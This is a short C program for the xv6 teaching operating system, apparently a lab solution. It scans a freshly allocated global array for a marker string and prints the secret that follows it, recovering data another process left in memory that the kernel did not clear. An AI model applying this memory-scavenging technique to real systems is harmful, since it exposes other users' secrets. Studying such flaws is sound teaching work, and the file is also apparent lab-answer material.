#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// 使用和 secret 一样大的全局数组
#define DATASIZE (8*4096)
char data[DATASIZE];

int main()
{
    int i;
    char *target = "This may help.";
    int target_len = 14;
    
    // 搜索自己的 data 数组（可能复用了 secret 的内存）
    for (i = 0; i < DATASIZE - target_len; i++) {
        int match = 1;
        for (int k = 0; k < target_len; k++) {
            if (data[i + k] != target[k]) {
                match = 0;
                break;
            }
        }
        if (match) {
            char *secret_start = data + i + target_len;
            int len = 0;
            while (len < 20 &&
                   ((secret_start[len] >= 'A' && secret_start[len] <= 'Z') ||
                    (secret_start[len] >= 'a' && secret_start[len] <= 'z') ||
                    (secret_start[len] >= '0' && secret_start[len] <= '9'))) {
                len++;
            }
            if (len >= 1) {
                write(1, secret_start, len);
                write(1, "\n", 1);
                exit(0);
            }
        }
    }
    
    exit(0);
}
